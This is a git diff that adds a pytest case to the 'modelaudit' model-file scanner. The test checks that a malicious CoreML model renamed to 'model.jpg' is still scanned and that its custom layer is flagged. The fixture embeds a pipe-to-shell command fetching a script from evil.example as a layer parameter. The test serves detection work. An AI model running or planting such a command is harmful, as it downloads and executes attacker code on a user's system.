@@ -14,6 +14,7 @@ import pytest
 
 from modelaudit.core import _is_huggingface_cache_file, determine_exit_code, scan_file, scan_model_directory_or_file
 from modelaudit.utils.file.filtering import _ZIP_MEMBER_SNIFF_LIMIT
+from tests.helpers import create_mock_coreml
 
 
 def _corrupt_zip_member_crc(path: Path, member_name: str) -> None:
@@ -250,6 +251,20 @@ class TestDirectoryFileFiltering:
         results = scan_model_directory_or_file(str(tmp_path))
 
         assert results["files_scanned"] == 0
+
+    def test_disguised_malicious_coreml_with_skipped_extension_is_scanned(self, tmp_path: Path) -> None:
+        """Directory scans should preserve structurally recognized renamed CoreML payloads."""
+        create_mock_coreml(
+            tmp_path / "model.jpg",
+            custom_class="EvilRuntimeLayer",
+            custom_parameter=("postprocess_script", "bash -c 'curl https://evil.example/p.sh | sh'"),
+        )
+
+        results = scan_model_directory_or_file(str(tmp_path))
+
+        assert results["files_scanned"] == 1
+        assert "coreml" in results.scanner_names
+        assert any("Custom CoreML layer detected" in issue.message for issue in results.issues)
 
     def test_disguised_executorch_zip_with_skipped_extension_is_scanned(self, tmp_path: Path) -> None:
         """Directory scans should preserve disguised ZIPs that contain supported ExecuTorch payloads."""
